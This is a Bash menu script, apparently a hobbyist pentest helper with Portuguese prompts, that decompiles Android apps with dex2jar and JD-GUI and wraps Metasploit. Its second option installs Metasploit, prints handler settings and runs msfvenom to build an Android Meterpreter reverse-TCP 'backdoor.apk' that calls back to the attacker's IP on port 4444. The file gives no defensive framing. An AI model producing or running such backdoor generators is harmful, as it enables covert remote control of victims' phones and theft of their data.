
#!/bin/bash

echo "---------------------------------------------------------_"
echo "------------           J.A.R.V.S        ------------------"
echo ".........................................................."

echo "1 --> J2dex/Jd-GUI"
echo "2 --> MSF/msfconsole/msfvenom"
echo "3 --> ?"
echo "4 --> ?"
echo "5 --> ?"
read  op

  if [ $op -eq 1 ];then
echo "1 --> J2dex"
echo "2 --> JD-GUI"
read a
  if [ $a -eq 1 ];then
echo " "
if [ $1 ];then
touch d2j_invoke.sh
echo #!/bin/sh >> d2j_invoke.sh
echo 'PRG="$0"' >> d2j_invoke.sh
echo 'while [ -h "$PRG" ] ; do' >> d2j_invoke.sh
echo  'ls=`ls -ld "$PRG"`' >> d2j_invoke.sh
echo  link=\`expr '"$ls"' : "'.*-> \(.*\)$'"\`  >> d2j_invoke.sh
echo  'if expr "$link" : "'/.*'" > /dev/null; then' >> d2j_invoke.sh
echo    'PRG="$link"' >> d2j_invoke.sh
echo   'else' >> d2j_invoke.sh
echo     'PRG=`dirname "$PRG"`/"$link"' >> d2j_invoke.sh
echo   'fi' >> d2j_invoke.sh
echo 'done' >> d2j_invoke.sh
echo 'PRGDIR=`dirname "$PRG"`' >> d2j_invoke.sh


echo '_classpath="."' >> d2j_invoke.sh
echo 'if [ `uname -a | grep -i -c cygwin` -ne 0 ]; then'  >> d2j_invoke.sh
echo   ' for k in "$PRGDIR"/lib/*.jar' >> d2j_invoke.sh
echo    'do' >> d2j_invoke.sh
echo        '_classpath="${_classpath};`cygpath -w ${k}`"' >> d2j_invoke.sh
echo    'done' >> d2j_invoke.sh
echo 'else' >> d2j_invoke.sh
echo    'for k in "$PRGDIR"/lib/*.jar' >> d2j_invoke.sh
echo    'do' >> d2j_invoke.sh
echo       '_classpath="${_classpath}:${k}"' >> d2j_invoke.sh
echo    'done' >> d2j_invoke.sh
echo 'fi' >> d2j_invoke.sh

echo 'java -Xms512m -Xmx1024m -classpath "${_classpath}" "$@"' >> d2j_invoke.sh
chmod 777 d2j_invoke.sh
echo "\n .................................EXTRAINDO! ................... (( ok ))"
PRG=$1
while [ -h "$PRG" ] ; do
  ls=`ls -ld "$PRG"`
  link=`expr "$ls" : '.*-> \(.*\)$'`
  if expr "$link" : '/.*' > /dev/null; then
    PRG="$link"
  else
    PRG=`dirname "$PRG"`/"$link"
  fi
done
PRGDIR=`dirname "$PRG"`
#

# call d2j_invoke.sh to setup java environment
"$PRGDIR/d2j_invoke.sh" "com.googlecode.dex2jar.tools.Dex2jarCmd" "$@"
rm -rf d2j_invoke.sh
echo "\n\n"
echo "\n ........................                            ..........  (<oko>)"
echo "\n ........................           FINISH!          .......... (( [[]] ))"
echo "\n"
else
echo "Obs: Mover o arquivo.dex  <para-esta-pasta>"
echo "Sytax: sh jarvis.sh <aquivo.dex>"
fi
elif [ $a -eq 2 ];then
echo "--------------  Abrindo JD-GUI ------------"
java -jar lib/jd-gui.jar
fi

elif [ $op -eq 2 ];then

echo " ..................... INSTALANDO ................>>  waiting.."
sudo apt-cache search  metasploit-framework
sudo apt-get install metasploit-framework
clear
echo " ..................... INSTALAdO! ................>>  OK"
sleep 3;
echo "1 --> msfconsole"
echo "2 --> msfvenom"
read msf
  if [ $msf -eq 1 ];then
echo "..........                > ABRINDO MSFCONSOLE ...>OK!"
echo "use exploit/multi/handler"
echo "set payload android/meterpreter/reverse_tcp"
echo "set LHOST <IPLocal/IPExterno>"
echo "........................................>>>>>"
clear
sudo msfconsole
elif [ $msf -eq 2 ];then
echo "GERANDO BACKDOR PARA REDE INTERNA......"
ip=`ifconfig | grep broadcast |  cut -c14-26`
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="$ip" LPORT=4444 > $PWD/backdoor.apk

fi
elif [ $op -eq 3 ];then
echo " "
elif [ $op -eq 4 ];then
echo " "
elif [ $op -eq 5 ];then
echo " "
fi
